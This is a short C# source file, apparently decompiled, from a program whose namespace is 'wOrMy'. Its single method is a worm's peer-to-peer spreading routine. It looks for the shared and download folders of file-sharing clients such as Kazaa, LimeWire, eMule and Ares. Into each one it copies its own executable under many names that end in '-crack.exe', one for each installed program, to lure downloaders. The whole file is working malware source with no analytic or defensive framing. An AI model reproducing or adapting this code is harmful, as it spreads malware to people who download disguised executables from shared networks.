using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using Microsoft.VisualBasic.CompilerServices;

namespace wOrMy;

[StandardModule]
internal sealed class p22p
{
	public static void p22p_sp()
	{
		ArrayList arrayList = new ArrayList();
		arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\Downloads");
		arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\My Shared Folder");
		arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\Shared");
		arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Ares\\My Shared Folder");
		arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Downloads");
		arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\Shareaza\\Downloads");
		arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\emule\\incoming\\");
		arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\kazaa\\my shared folder\\");
		arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\kazaa lite\\my shared folder\\");
		arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\kazaa lite k++\\my shared folder\\");
		arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\icq\\shared folder\\");
		arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\grokster\\my grokster\\");
		arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\bearshare\\shared\\");
		arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\edonkey2000\\incoming\\");
		arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\morpheus\\my shared folder\\");
		arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\limewire\\shared\\");
		arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\tesla\\files\\");
		arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\winmx\\shared\\");
		IEnumerator enumerator = arrayList.GetEnumerator();
		while (enumerator.MoveNext())
		{
			string text = Convert.ToString(RuntimeHelpers.GetObjectValue(enumerator.Current));
			if (Directory.Exists(text))
			{
				string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
				string[] directories = Directory.GetDirectories(folderPath);
				foreach (string text2 in directories)
				{
					string destFileName = text + "\\" + text2.Substring(text2.LastIndexOf("\\")).Replace("\\", string.Empty) + "-crack.exe";
					File.Copy(Process.GetCurrentProcess().MainModule!.FileName, destFileName, overwrite: true);
				}
			}
		}
	}
}
